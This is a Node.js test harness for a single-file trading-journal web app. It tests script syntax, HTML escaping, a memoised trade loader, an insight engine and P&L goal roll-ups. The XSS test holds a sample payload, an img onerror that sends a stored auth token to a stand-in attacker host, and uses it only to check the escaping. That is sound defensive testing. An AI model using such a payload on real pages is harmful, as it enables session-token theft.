#!/usr/bin/env node
/**
 * RTC test harness
 * ----------------
 * The app is one HTML file with no build step — so instead of importing modules,
 * we extract the pure logic out of index.html and exercise it in Node.
 *
 * Why this exists: you cannot safely refactor code you cannot test. This is the
 * safety net that makes every future architectural change provable instead of hopeful.
 *
 * Run:  node test/run.js
 * CI:   exits non-zero on any failure, so it can gate a deploy.
 */
'use strict';
const fs = require('fs');
const path = require('path');

const SRC = fs.readFileSync(path.join(__dirname, '..', 'index.html'), 'utf8');

/* ── tiny assertion kit ─────────────────────────────────────── */
let passed = 0, failed = 0;
const results = [];
function ok(name, cond, detail) {
  if (cond) { passed++; results.push(`  \x1b[32m✓\x1b[0m ${name}`); }
  else { failed++; results.push(`  \x1b[31m✗\x1b[0m ${name}${detail ? `\n      → ${detail}` : ''}`); }
}
function group(name) { results.push(`\n\x1b[1m${name}\x1b[0m`); }

/* ── extract a top-level function/var block from index.html ─── */
function grab(signature, opener = '{', closer = '}') {
  const i = SRC.indexOf(signature);
  if (i === -1) throw new Error(`extract failed — not found in index.html: ${signature}`);
  let depth = 0, j = SRC.indexOf(opener, i);
  for (; j < SRC.length; j++) {
    if (SRC[j] === opener) depth++;
    else if (SRC[j] === closer) { depth--; if (depth === 0) { j++; break; } }
  }
  return SRC.slice(i, j);
}

/* Indirect eval runs in global scope, so extracted declarations become globals
   the tests can call. (A direct eval() in strict mode keeps them scoped locally.) */
const globalEval = eval;
function load(...signatures) { signatures.forEach(s => globalEval(grab(s) + ';')); }

/* ── 1. SYNTAX: every inline script must parse ──────────────── */
group('Syntax');
{
  const { execFileSync } = require('child_process');
  const os = require('os');
  const blocks = SRC.match(/<script(?![^>]*\bsrc=)[^>]*>([\s\S]*?)<\/script>/g) || [];
  let bad = 0;
  blocks.forEach((b, i) => {
    const body = b.replace(/^<script[^>]*>/, '').replace(/<\/script>$/, '');
    const f = path.join(os.tmpdir(), `rtc-block-${i}.js`);
    fs.writeFileSync(f, body);
    try { execFileSync(process.execPath, ['--check', f], { stdio: 'pipe' }); }
    catch (e) { bad++; results.push(`      block ${i}: ${String(e.stderr).split('\n')[0]}`); }
    fs.unlinkSync(f);
  });
  ok(`all ${blocks.length} inline script blocks parse`, bad === 0, `${bad} block(s) failed`);
}

/* ── 2. SECURITY: XSS escaping ──────────────────────────────── */
group('Security · XSS escaping');
{
  load('function _esc');
  const payload = `<img src=x onerror="fetch('https://evil.tld/?t='+localStorage.getItem('sb-auth-token'))">`;
  const out = _esc(payload);
  ok('script-bearing tag is neutralised', !/<img/i.test(out));
  ok('attribute quotes are escaped', !out.includes('"'));
  ok('ampersands escaped first (no double-decode)', _esc('&lt;') === '&amp;lt;');
  ok('null/undefined safe', _esc(null) === '' && _esc(undefined) === '');
}

/* ── 3. PERF: getTrades() memoisation ───────────────────────── */
group('Performance · getTrades memoisation');
{
  const store = { 'rtc_trades_0': JSON.stringify([{ id: 1, pct: 80 }]) };
  global.RTCStore = { get: k => store[k] };
  global.getActiveIdx = () => 0;
  global.tradeKey = i => 'rtc_trades_' + i;
  load('var _tradesMemo', 'function getTrades');

  const a = getTrades(), b = getTrades();
  ok('same raw string returns cached object (no re-parse)', a === b);

  a.unshift({ id: 2, pct: 90 });
  store['rtc_trades_0'] = JSON.stringify(a);
  const c = getTrades();
  ok('write invalidates cache (fresh parse)', c !== a);
  ok('data integrity preserved after write', c.length === 2 && c[0].id === 2);

  store['rtc_trades_0'] = '{corrupt';
  global._tradesMemo = { raw: null, val: null };
  let crashed = false, val;
  try { val = getTrades(); } catch (e) { crashed = true; }
  ok('corrupt JSON degrades gracefully instead of crashing', !crashed && Array.isArray(val) && val.length === 0);
}

/* ── 4. DOMAIN: the Mirror insight engine ───────────────────── */
group('Domain · Mirror engine');
{
  load('function _mAvg', 'function _mPct', 'function _mHour', 'function _mDay', 'function computeMirror');

  const day = off => { const d = new Date(); d.setDate(d.getDate() - off); return d.toDateString(); };
  const trades = [];
  for (let i = 0; i < 6; i++) trades.push({ pct: 55, sleepHours: 5, date: day(10 + i), time: '09:35 AM', tags: [] });
  for (let i = 0; i < 6; i++) trades.push({ pct: 85, sleepHours: 8, date: day(20 + i), time: '09:35 AM', tags: [] });

  const m = computeMirror(trades);
  ok('identifies low sleep as the kryptonite', !!m.kryptonite && /hour|sleep/i.test(m.kryptonite.label), JSON.stringify(m.kryptonite));
  ok('kryptonite gap is quantified', !!m.kryptonite && m.kryptonite.gap >= 10);
  ok('produces a revelation feed', Array.isArray(m.feed) && m.feed.length > 0);
  ok('no false insights on thin data', (() => {
    const r = computeMirror([{ pct: 80, sleepHours: 8, date: day(1), time: '09:35 AM', tags: [] }]);
    return !r.kryptonite && r.feed.length === 0;
  })(), 'engine invented a pattern from a single trade');
}

/* ── 5. MONEY: trade P&L → goal roll-up ─────────────────────── */
group('Money · P&L flows into goal');
{
  global.goalData = { amt: 5000, days: 30, name: 'test', daily: 100 };
  global.pnlLog = [];
  global.savePnl = () => {};
  global.renderGoals = () => {};
  load('function applyTradePnlToGoal');

  applyTradePnlToGoal(300, true);   // win
  applyTradePnlToGoal(-120, true);  // loss
  applyTradePnlToGoal(50, true);    // win
  ok('same-day trades aggregate into ONE goal day', pnlLog.length === 1, `got ${pnlLog.length} entries — would burn extra days off the goal`);
  ok('daily total is correct', pnlLog[0].pnl === 230);

  applyTradePnlToGoal(-200 - (-120), false); // edit that loss to -200
  const total = pnlLog.reduce((s, e) => s + e.pnl, 0);
  ok('editing a trade adjusts by delta (no double count)', total === 150, `expected 150, got ${total}`);
}

/* ── report ─────────────────────────────────────────────────── */
console.log(results.join('\n'));
console.log(`\n${passed} passed, ${failed} failed\n`);
process.exit(failed ? 1 : 0);
